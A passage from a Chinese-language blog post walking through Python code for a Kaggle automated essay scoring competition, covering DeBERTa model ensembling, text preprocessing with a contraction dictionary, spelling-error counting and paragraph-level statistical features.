TrainingArguments,</span><br><span class="line">    Trainer,</span><br><span class="line">    DataCollatorWithPadding,</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> scipy.special <span class="keyword">import</span> softmax</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> gc</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line">MODEL_PATHS = [</span><br><span class="line">    <span class="string">&#x27;/kaggle/input/aes2-400-20240419134941/*/*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/kaggle/input/best-model-1/deberta-large-fold1/checkpoint-100/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/kaggle/input/train-best-model-3/deberta-large-fold1/checkpoint-200/&#x27;</span></span><br><span class="line">]</span><br><span class="line">EVAL_BATCH_SIZE = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">models = []</span><br><span class="line"><span class="keyword">for</span> path <span class="keyword">in</span> MODEL_PATHS:</span><br><span class="line">    models.extend(glob.glob(path))</span><br><span class="line"></span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(models[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tokenize</span>(<span class="params">sample</span>):</span><br><span class="line">    <span class="keyword">return</span> tokenizer(sample[<span class="string">&#x27;full_text&#x27;</span>], max_length=MAX_LENGTH, truncation=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">df_test = pd.read_csv(TEST_DATA_PATH)</span><br><span class="line">ds = Dataset.from_pandas(df_test).<span class="built_in">map</span>(tokenize).remove_columns([<span class="string">&#x27;essay_id&#x27;</span>, <span class="string">&#x27;full_text&#x27;</span>])</span><br><span class="line"></span><br><span class="line">args = TrainingArguments(</span><br><span class="line">    <span class="string">&quot;.&quot;</span>, </span><br><span class="line">    per_device_eval_batch_size=EVAL_BATCH_SIZE, </span><br><span class="line">    report_to=<span class="string">&quot;none&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">predictions = []</span><br><span class="line"><span class="keyword">for</span> model <span class="keyword">in</span> models:</span><br><span class="line">    model = AutoModelForSequenceClassification.from_pretrained(model)</span><br><span class="line">    trainer = Trainer(</span><br><span class="line">        model=model, </span><br><span class="line">        args=args, </span><br><span class="line">        data_collator=DataCollatorWithPadding(tokenizer), </span><br><span class="line">        tokenizer=tokenizer</span><br><span class="line">    )    </span><br><span class="line">    preds = trainer.predict(ds).predictions</span><br><span class="line">    predictions.append(softmax(preds, axis=-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">del</span> model, trainer</span><br><span class="line">    torch.cuda.empty_cache()</span><br><span class="line">    gc.collect()</span><br></pre></td></tr></table></figure><p>提取DeBERTa的prediction</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">predicted_score = <span class="number">0.</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> predictions:</span><br><span class="line">    predicted_score += p</span><br><span class="line">    </span><br><span class="line">predicted_score /= <span class="built_in">len</span>(predictions)</span><br><span class="line">df_test[<span class="string">&#x27;score&#x27;</span>] = predicted_score.argmax(-<span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">df_test.head()</span><br></pre></td></tr></table></figure><p><img src="deberta_res.png" /></p><h2 id="feature-engineering">Feature Engineering</h2><h3 id="text---paragraph">1. text -&gt; paragraph</h3><p>依据换行划分自然段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">columns = [  </span><br><span class="line">    (</span><br><span class="line">        pl.col(<span class="string">&quot;full_text&quot;</span>).<span class="built_in">str</span>.split(by=<span class="string">&quot;\n\n&quot;</span>).alias(<span class="string">&quot;paragraph&quot;</span>)</span><br><span class="line">    ),</span><br><span class="line">]</span><br><span class="line">PATH = <span class="string">&quot;/kaggle/input/learning-agency-lab-automated-essay-scoring-2/&quot;</span></span><br><span class="line"></span><br><span class="line">train = pl.read_csv(PATH + <span class="string">&quot;train.csv&quot;</span>).with_columns(columns)</span><br><span class="line">test = pl.read_csv(PATH + <span class="string">&quot;test.csv&quot;</span>).with_columns(columns)</span><br><span class="line"></span><br><span class="line">train.head(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="data-preprocessing">2. data preprocessing</h3><p>具体包括了:</p><ol type="1"><li>缩写展开</li><li>html移除</li><li>无用信息比如 @ 和标点符号的移除</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">cList = &#123;</span><br><span class="line">  <span class="string">&quot;ain&#x27;t&quot;</span>: <span class="string">&quot;am not&quot;</span>,<span class="string">&quot;aren&#x27;t&quot;</span>: <span class="string">&quot;are not&quot;</span>,<span class="string">&quot;can&#x27;t&quot;</span>: <span class="string">&quot;cannot&quot;</span>,<span class="string">&quot;can&#x27;t&#x27;ve&quot;</span>: <span class="string">&quot;cannot have&quot;</span>,<span class="string">&quot;&#x27;cause&quot;</span>: <span class="string">&quot;because&quot;</span>,  <span class="string">&quot;could&#x27;ve&quot;</span>: <span class="string">&quot;could have&quot;</span>,<span class="string">&quot;couldn&#x27;t&quot;</span>: <span class="string">&quot;could not&quot;</span>,<span class="string">&quot;couldn&#x27;t&#x27;ve&quot;</span>: <span class="string">&quot;could not have&quot;</span>,<span class="string">&quot;didn&#x27;t&quot;</span>: <span class="string">&quot;did not&quot;</span>,<span class="string">&quot;doesn&#x27;t&quot;</span>: <span class="string">&quot;does not&quot;</span>,<span class="string">&quot;don&#x27;t&quot;</span>: <span class="string">&quot;do not&quot;</span>,<span class="string">&quot;hadn&#x27;t&quot;</span>: <span class="string">&quot;had not&quot;</span>,<span class="string">&quot;hadn&#x27;t&#x27;ve&quot;</span>: <span class="string">&quot;had not have&quot;</span>,<span class="string">&quot;hasn&#x27;t&quot;</span>: <span class="string">&quot;has not&quot;</span>,</span><br><span class="line">  <span class="string">&quot;haven&#x27;t&quot;</span>: <span class="string">&quot;have not&quot;</span>,<span class="string">&quot;he&#x27;d&quot;</span>: <span class="string">&quot;he would&quot;</span>,<span class="string">&quot;he&#x27;d&#x27;ve&quot;</span>: <span class="string">&quot;he would have&quot;</span>,<span class="string">&quot;he&#x27;ll&quot;</span>: <span class="string">&quot;he will&quot;</span>,<span class="string">&quot;he&#x27;ll&#x27;ve&quot;</span>: <span class="string">&quot;he will have&quot;</span>,<span class="string">&quot;he&#x27;s&quot;</span>: <span class="string">&quot;he is&quot;</span>,</span><br><span class="line">  <span class="string">&quot;how&#x27;d&quot;</span>: <span class="string">&quot;how did&quot;</span>,<span class="string">&quot;how&#x27;d&#x27;y&quot;</span>: <span class="string">&quot;how do you&quot;</span>,<span class="string">&quot;how&#x27;ll&quot;</span>: <span class="string">&quot;how will&quot;</span>,<span class="string">&quot;how&#x27;s&quot;</span>: <span class="string">&quot;how is&quot;</span>,<span class="string">&quot;I&#x27;d&quot;</span>: <span class="string">&quot;I would&quot;</span>,<span class="string">&quot;I&#x27;d&#x27;ve&quot;</span>: <span class="string">&quot;I would have&quot;</span>,<span class="string">&quot;I&#x27;ll&quot;</span>: <span class="string">&quot;I will&quot;</span>,<span class="string">&quot;I&#x27;ll&#x27;ve&quot;</span>: <span class="string">&quot;I will have&quot;</span>,<span class="string">&quot;I&#x27;m&quot;</span>: <span class="string">&quot;I am&quot;</span>,<span class="string">&quot;I&#x27;ve&quot;</span>: <span class="string">&quot;I have&quot;</span>,</span><br><span class="line">  <span class="string">&quot;isn&#x27;t&quot;</span>: <span class="string">&quot;is not&quot;</span>,<span class="string">&quot;it&#x27;d&quot;</span>: <span class="string">&quot;it had&quot;</span>,<span class="string">&quot;it&#x27;d&#x27;ve&quot;</span>: <span class="string">&quot;it would have&quot;</span>,<span class="string">&quot;it&#x27;ll&quot;</span>: <span class="string">&quot;it will&quot;</span>, <span class="string">&quot;it&#x27;ll&#x27;ve&quot;</span>: <span class="string">&quot;it will have&quot;</span>,<span class="string">&quot;it&#x27;s&quot;</span>: <span class="string">&quot;it is&quot;</span>,<span class="string">&quot;let&#x27;s&quot;</span>: <span class="string">&quot;let us&quot;</span>,<span class="string">&quot;ma&#x27;am&quot;</span>: <span class="string">&quot;madam&quot;</span>,<span class="string">&quot;mayn&#x27;t&quot;</span>: <span class="string">&quot;may not&quot;</span>,</span><br><span class="line">  <span class="string">&quot;might&#x27;ve&quot;</span>: <span class="string">&quot;might have&quot;</span>,<span class="string">&quot;mightn&#x27;t&quot;</span>: <span class="string">&quot;might not&quot;</span>,<span class="string">&quot;mightn&#x27;t&#x27;ve&quot;</span>: <span class="string">&quot;might not have&quot;</span>,<span class="string">&quot;must&#x27;ve&quot;</span>: <span class="string">&quot;must have&quot;</span>,<span class="string">&quot;mustn&#x27;t&quot;</span>: <span class="string">&quot;must not&quot;</span>,<span class="string">&quot;mustn&#x27;t&#x27;ve&quot;</span>: <span class="string">&quot;must not have&quot;</span>,<span class="string">&quot;needn&#x27;t&quot;</span>: <span class="string">&quot;need not&quot;</span>,<span class="string">&quot;needn&#x27;t&#x27;ve&quot;</span>: <span class="string">&quot;need not have&quot;</span>,<span class="string">&quot;o&#x27;clock&quot;</span>: <span class="string">&quot;of the clock&quot;</span>,<span class="string">&quot;oughtn&#x27;t&quot;</span>: <span class="string">&quot;ought not&quot;</span>,<span class="string">&quot;oughtn&#x27;t&#x27;ve&quot;</span>: <span class="string">&quot;ought not have&quot;</span>,<span class="string">&quot;shan&#x27;t&quot;</span>: <span class="string">&quot;shall not&quot;</span>,<span class="string">&quot;sha&#x27;n&#x27;t&quot;</span>: <span class="string">&quot;shall not&quot;</span>,</span><br><span class="line">  <span class="string">&quot;shan&#x27;t&#x27;ve&quot;</span>: <span class="string">&quot;shall not have&quot;</span>,<span class="string">&quot;she&#x27;d&quot;</span>: <span class="string">&quot;she would&quot;</span>,<span class="string">&quot;she&#x27;d&#x27;ve&quot;</span>: <span class="string">&quot;she would have&quot;</span>,<span class="string">&quot;she&#x27;ll&quot;</span>: <span class="string">&quot;she will&quot;</span>,<span class="string">&quot;she&#x27;ll&#x27;ve&quot;</span>: <span class="string">&quot;she will have&quot;</span>,<span class="string">&quot;she&#x27;s&quot;</span>: <span class="string">&quot;she is&quot;</span>,</span><br><span class="line">  <span class="string">&quot;should&#x27;ve&quot;</span>: <span class="string">&quot;should have&quot;</span>,<span class="string">&quot;shouldn&#x27;t&quot;</span>: <span class="string">&quot;should not&quot;</span>,<span class="string">&quot;shouldn&#x27;t&#x27;ve&quot;</span>: <span class="string">&quot;should not have&quot;</span>,<span class="string">&quot;so&#x27;ve&quot;</span>: <span class="string">&quot;so have&quot;</span>,<span class="string">&quot;so&#x27;s&quot;</span>: <span class="string">&quot;so is&quot;</span>,<span class="string">&quot;that&#x27;d&quot;</span>: <span class="string">&quot;that would&quot;</span>,<span class="string">&quot;that&#x27;d&#x27;ve&quot;</span>: <span class="string">&quot;that would have&quot;</span>,<span class="string">&quot;that&#x27;s&quot;</span>: <span class="string">&quot;that is&quot;</span>,<span class="string">&quot;there&#x27;d&quot;</span>: <span class="string">&quot;there had&quot;</span>,<span class="string">&quot;there&#x27;d&#x27;ve&quot;</span>: <span class="string">&quot;there would have&quot;</span>,<span class="string">&quot;there&#x27;s&quot;</span>: <span class="string">&quot;there is&quot;</span>,<span class="string">&quot;they&#x27;d&quot;</span>: <span class="string">&quot;they would&quot;</span>,<span class="string">&quot;they&#x27;d&#x27;ve&quot;</span>: <span class="string">&quot;they would have&quot;</span>,<span class="string">&quot;they&#x27;ll&quot;</span>: <span class="string">&quot;they will&quot;</span>,<span class="string">&quot;they&#x27;ll&#x27;ve&quot;</span>: <span class="string">&quot;they will have&quot;</span>,<span class="string">&quot;they&#x27;re&quot;</span>: <span class="string">&quot;they are&quot;</span>,<span class="string">&quot;they&#x27;ve&quot;</span>: <span class="string">&quot;they have&quot;</span>,<span class="string">&quot;to&#x27;ve&quot;</span>: <span class="string">&quot;to have&quot;</span>,<span class="string">&quot;wasn&#x27;t&quot;</span>: <span class="string">&quot;was not&quot;</span>,<span class="string">&quot;we&#x27;d&quot;</span>: <span class="string">&quot;we had&quot;</span>,</span><br><span class="line">  <span class="string">&quot;we&#x27;d&#x27;ve&quot;</span>: <span class="string">&quot;we would have&quot;</span>,<span class="string">&quot;we&#x27;ll&quot;</span>: <span class="string">&quot;we will&quot;</span>,<span class="string">&quot;we&#x27;ll&#x27;ve&quot;</span>: <span class="string">&quot;we will have&quot;</span>,<span class="string">&quot;we&#x27;re&quot;</span>: <span class="string">&quot;we are&quot;</span>,<span class="string">&quot;we&#x27;ve&quot;</span>: <span class="string">&quot;we have&quot;</span>,</span><br><span class="line">  <span class="string">&quot;weren&#x27;t&quot;</span>: <span class="string">&quot;were not&quot;</span>,<span class="string">&quot;what&#x27;ll&quot;</span>: <span class="string">&quot;what will&quot;</span>,<span class="string">&quot;what&#x27;ll&#x27;ve&quot;</span>: <span class="string">&quot;what will have&quot;</span>,</span><br><span class="line">  <span class="string">&quot;what&#x27;re&quot;</span>: <span class="string">&quot;what are&quot;</span>,<span class="string">&quot;what&#x27;s&quot;</span>: <span class="string">&quot;what is&quot;</span>,<span class="string">&quot;what&#x27;ve&quot;</span>: <span class="string">&quot;what have&quot;</span>,<span class="string">&quot;when&#x27;s&quot;</span>: <span class="string">&quot;when is&quot;</span>,<span class="string">&quot;when&#x27;ve&quot;</span>: <span class="string">&quot;when have&quot;</span>,</span><br><span class="line">  <span class="string">&quot;where&#x27;d&quot;</span>: <span class="string">&quot;where did&quot;</span>,<span class="string">&quot;where&#x27;s&quot;</span>: <span class="string">&quot;where is&quot;</span>,<span class="string">&quot;where&#x27;ve&quot;</span>: <span class="string">&quot;where have&quot;</span>,<span class="string">&quot;who&#x27;ll&quot;</span>: <span class="string">&quot;who will&quot;</span>,<span class="string">&quot;who&#x27;ll&#x27;ve&quot;</span>: <span class="string">&quot;who will have&quot;</span>,<span class="string">&quot;who&#x27;s&quot;</span>: <span class="string">&quot;who is&quot;</span>,<span class="string">&quot;who&#x27;ve&quot;</span>: <span class="string">&quot;who have&quot;</span>,<span class="string">&quot;why&#x27;s&quot;</span>: <span class="string">&quot;why is&quot;</span>,</span><br><span class="line">  <span class="string">&quot;why&#x27;ve&quot;</span>: <span class="string">&quot;why have&quot;</span>,<span class="string">&quot;will&#x27;ve&quot;</span>: <span class="string">&quot;will have&quot;</span>,<span class="string">&quot;won&#x27;t&quot;</span>: <span class="string">&quot;will not&quot;</span>,<span class="string">&quot;won&#x27;t&#x27;ve&quot;</span>: <span class="string">&quot;will not have&quot;</span>,<span class="string">&quot;would&#x27;ve&quot;</span>: <span class="string">&quot;would have&quot;</span>,<span class="string">&quot;wouldn&#x27;t&quot;</span>: <span class="string">&quot;would not&quot;</span>,</span><br><span class="line">  <span class="string">&quot;wouldn&#x27;t&#x27;ve&quot;</span>: <span class="string">&quot;would not have&quot;</span>,<span class="string">&quot;y&#x27;all&quot;</span>: <span class="string">&quot;you all&quot;</span>,<span class="string">&quot;y&#x27;alls&quot;</span>: <span class="string">&quot;you alls&quot;</span>,<span class="string">&quot;y&#x27;all&#x27;d&quot;</span>: <span class="string">&quot;you all would&quot;</span>,</span><br><span class="line">  <span class="string">&quot;y&#x27;all&#x27;d&#x27;ve&quot;</span>: <span class="string">&quot;you all would have&quot;</span>,<span class="string">&quot;y&#x27;all&#x27;re&quot;</span>: <span class="string">&quot;you all are&quot;</span>,<span class="string">&quot;y&#x27;all&#x27;ve&quot;</span>: <span class="string">&quot;you all have&quot;</span>,<span class="string">&quot;you&#x27;d&quot;</span>: <span class="string">&quot;you had&quot;</span>,<span class="string">&quot;you&#x27;d&#x27;ve&quot;</span>: <span class="string">&quot;you would have&quot;</span>,<span class="string">&quot;you&#x27;ll&quot;</span>: <span class="string">&quot;you you will&quot;</span>,<span class="string">&quot;you&#x27;ll&#x27;ve&quot;</span>: <span class="string">&quot;you you will have&quot;</span>,<span class="string">&quot;you&#x27;re&quot;</span>: <span class="string">&quot;you are&quot;</span>,  <span class="string">&quot;you&#x27;ve&quot;</span>: <span class="string">&quot;you have&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">c_re = re.<span class="built_in">compile</span>(<span class="string">&#x27;(%s)&#x27;</span> % <span class="string">&#x27;|&#x27;</span>.join(cList.keys()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">expandContractions</span>(<span class="params">text, c_re=c_re</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">replace</span>(<span class="params"><span class="keyword">match</span></span>):</span><br><span class="line">        <span class="keyword">return</span> cList[<span class="keyword">match</span>.group(<span class="number">0</span>)]</span><br><span class="line">    <span class="keyword">return</span> c_re.sub(replace, text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">removeHTML</span>(<span class="params">x</span>):</span><br><span class="line">    html=re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;.*?&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> html.sub(<span class="string">r&#x27;&#x27;</span>,x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dataPreprocessing</span>(<span class="params">x</span>):</span><br><span class="line">    x = x.lower()</span><br><span class="line">    x = removeHTML(x)</span><br><span class="line">    x = re.sub(<span class="string">&quot;@\w+&quot;</span>, <span class="string">&#x27;&#x27;</span>,x)</span><br><span class="line">    x = re.sub(<span class="string">&quot;&#x27;\d+&quot;</span>, <span class="string">&#x27;&#x27;</span>,x)</span><br><span class="line">    x = re.sub(<span class="string">&quot;\d+&quot;</span>, <span class="string">&#x27;&#x27;</span>,x)</span><br><span class="line">    x = re.sub(<span class="string">&quot;http\w+&quot;</span>, <span class="string">&#x27;&#x27;</span>,x)</span><br><span class="line">    x = re.sub(<span class="string">r&quot;\s+&quot;</span>, <span class="string">&quot; &quot;</span>, x)</span><br><span class="line"><span class="comment">#     x = expandContractions(x)</span></span><br><span class="line">    x = re.sub(<span class="string">r&quot;\.+&quot;</span>, <span class="string">&quot;.&quot;</span>, x)</span><br><span class="line">    x = re.sub(<span class="string">r&quot;\,+&quot;</span>, <span class="string">&quot;,&quot;</span>, x)</span><br><span class="line">    x = x.strip()</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_punctuation</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Remove all punctuation from the input text.</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">    - text (str): The input text.</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">    - str: The text with punctuation removed.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    translator = <span class="built_in">str</span>.maketrans(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, string.punctuation)</span><br><span class="line">    <span class="keyword">return</span> text.translate(translator)</span><br></pre></td></tr></table></figure><p>很专业好吧,这种缩写展开的词典肯定是经常做这份工作才能有的, 就像pentest选手人手password爆破字典一样.</p><h3 id="count-error">3. count error</h3><p><a href="https://www.kaggle.com/datasets/xianhellg/english-word-hx">english-word-hx地址</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> spacy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">nlp = spacy.load(<span class="string">&quot;en_core_web_sm&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/kaggle/input/english-word-hx/words.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    english_vocab = <span class="built_in">set</span>(word.strip().lower() <span class="keyword">for</span> word <span class="keyword">in</span> file)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">count_spelling_errors</span>(<span class="params">text</span>):</span><br><span class="line">    doc = nlp(text)</span><br><span class="line">    lemmatized_tokens = [token.lemma_.lower() <span class="keyword">for</span> token <span class="keyword">in</span> doc]</span><br><span class="line">    spelling_errors = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> token <span class="keyword">in</span> lemmatized_tokens <span class="keyword">if</span> token <span class="keyword">not</span> <span class="keyword">in</span> english_vocab)</span><br><span class="line">    <span class="keyword">return</span> spelling_errors</span><br></pre></td></tr></table></figure><p>这里就是依据英语单词字典, 将作文中每个词映射到词根然后判断词根是否出现在字典中, 一旦不在字典中就是拼写错误.</p><h3 id="第一波处理paragraph">第一波处理(paragraph)</h3><ol type="1"><li><p>预处理, 移除标点, 计算拼写错误, 计算自然段长度, 计算每个句子长度.</p></li><li><p>设置两个划分list, 统计自然段长度大于xx作为一个feature, 小于多少作为一个feature</p></li><li><p>一般特征加上拼写错误数量: 统计均值,最大,最小值,峰值等等一些统计学数据.</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Paragraph_Preprocess</span>(<span class="params">tmp</span>):</span><br><span class="line"></span><br><span class="line">    tmp = tmp.explode(<span class="string">&#x27;paragraph&#x27;</span>)</span><br><span class="line">    tmp = tmp.with_columns(pl.col(<span class="string">&#x27;paragraph&#x27;</span>).map_elements(dataPreprocessing))</span><br><span class="line">    tmp = tmp.with_columns(pl.col(<span class="string">&#x27;paragraph&#x27;</span>).map_elements(remove_punctuation).alias(<span class="string">&#x27;paragraph_no_pinctuation&#x27;</span>))</span><br><span class="line">    tmp = tmp.with_columns(pl.col(<span class="string">&#x27;paragraph_no_pinctuation&#x27;</span>).map_elements(count_spelling_errors).alias(<span class="string">&quot;paragraph_error_num&quot;</span>))</span><br><span class="line">    tmp = tmp.with_columns(pl.col(<span class="string">&#x27;paragraph&#x27;</span>).map_elements(<span class="keyword">lambda</span> x: <span class="built_in">len</span>(x)).alias(<span class="string">&quot;paragraph_len&quot;</span>))</span><br><span class="line">    tmp = tmp.with_columns(pl.col(<span class="string">&#x27;paragraph&#x27;</span>).map_elements(<span class="keyword">lambda</span> x: <span class="built_in">len</span>(x.split(<span class="string">&#x27;.&#x27;</span>))).alias(<span class="string">&quot;paragraph_sentence_cnt&quot;</span>),</span><br><span class="line">                    pl.col(<span class="string">&#x27;paragraph&#x27;</span>).map_elements(<span class="keyword">lambda</span> x: <span class="built_in">len</span>(x.split(<span class="string">&#x27; &#x27;</span>))).alias(<span class="string">&quot;paragraph_word_cnt&quot;</span>),)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># feature_eng</span></span><br><span class="line">paragraph_fea = [<span class="string">&#x27;paragraph_len&#x27;</span>,<span class="string">&#x27;paragraph_sentence_cnt&#x27;</span>,<span class="string">&#x27;paragraph_word_cnt&#x27;</span>]</span><br><span class="line">paragraph_fea2 = [<span class="string">&#x27;paragraph_error_num&#x27;</span>] + paragraph_fea</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Paragraph_Eng</span>(<span class="params">train_tmp</span>):</span><br><span class="line">    num_list = [<span class="number">0</span>, <span class="number">50</span>,<span class="number">75</span>,<span class="number">100</span>,<span class="number">125</span>,<span class="number">150</span>,<span class="number">175</span>,<span class="number">200</span>,<span class="number">250</span>,<span class="number">300</span>,<span class="number">350</span>,<span class="number">400</span>,<span class="number">500</span>,<span class="number">600</span>]</span><br><span class="line">    num_list2 = [<span class="number">0</span>, <span class="number">50</span>,<span class="number">75</span>,<span class="number">100</span>,<span class="number">125</span>,<span class="number">150</span>,<span class="number">175</span>,<span class="number">200</span>,<span class="number">250</span>,<span class="number">300</span>,<span class="number">350</span>,<span class="number">400</span>,<span class="number">500</span>,<span class="number">600</span>,<span class="number">700</span>]</span><br><span class="line">    aggs = [</span><br><span class="line">        *[pl.col(<span class="string">&#x27;paragraph&#x27;</span>).<span class="built_in">filter</span>(pl.col(<span class="string">&#x27;paragraph_len&#x27;</span>) &gt;= i).count().alias(<span class="string">f&quot;paragraph_&gt;<span class="subst">&#123;i&#125;</span>_cnt&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">50</span>,<span class="number">75</span>,<span class="number">100</span>,<span class="number">125</span>,<span class="number">150</span>,<span class="number">175</span>,<span class="number">200</span>,<span class="number">250</span>,<span class="number">300</span>,<span class="number">350</span>,<span class="number">400</span>,<span class="number">500</span>,<span class="number">600</span>,<span class="number">700</span>] ], </span><br><span class="line">        *[pl.col(<span class="string">&#x27;paragraph&#x27;</span>).<span class="built_in">filter</span>(pl.col(<span class="string">&#x27;paragraph_len&#x27;</span>) &lt;= i).count().alias(<span class="string">f&quot;paragraph_&lt;<span class="subst">&#123;i&#125;</span>_cnt&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">25</span>,<span class="number">49</span>]], </span><br><span class="line">        *[pl.col(fea).<span class="built_in">max</span>().alias(<span class="string">f&quot;<span class="subst">&#123;fea&#125;</span>_max&quot;</span>) <span class="keyword">for</span> fea <span class="keyword">in</span> paragraph_fea2],</span><br><span class="line">        *[pl.col(fea).mean().alias(<span class="string">f&quot;<span class="subst">&#123;fea&#125;</span>_mean&quot;</span>) <span class="keyword">for</span> fea <span class="keyword">in</span> paragraph_fea2],</span><br><span class="line">        *[pl.col(fea).<span class="built_in">min</span>().alias(<span class="string">f&quot;<span class="subst">&#123;fea&#125;</span>_min&quot;</span>) <span class="keyword">for</span> fea <span class="keyword">in</span> paragraph_fea2],</span><br><span class="line">        *[pl.col(fea).<span class="built_in">sum</span>().alias(<span class="string">f&quot;<span class="subst">&#123;fea&#125;</span>_sum&quot;</span>) <span class="keyword">for</span> fea <span class="keyword">in</span> paragraph_fea2],</span><br><span class="line">        *[pl.col(fea).first().alias(<span class="string">f&quot;<span class="subst">&#123;fea&#125;</span>_first&quot;</span>) <span class="keyword">for</span> fea <span class="keyword">in</span> paragraph_fea2],</span><br><span class="line">        *[pl.col(fea).last().alias(<span class="string">f&quot;<span class="subst">&#123;fea&#125;</span>_last&quot;</span>) <span class="keyword">for</span> fea <span class="keyword">in</span> paragraph_fea2],</span><br><span class="line">        *[pl.col(fea).kurtosis().alias(<span class="string">f&quot;<span class="subst">&#123;fea&#125;</span>_kurtosis&quot;</span>) <span class="keyword">for</span> fea <span class="keyword">in</span> paragraph_fea2],</span><br><span class="line">        *[pl.col(fea).quantile(<span class="number">0.25</span>).alias(<span class="string">f&quot;<span class="subst">&#123;fea&#125;</span>_q1&quot;</span>) <span class="keyword">for</span> fea <span class="keyword">in</span> 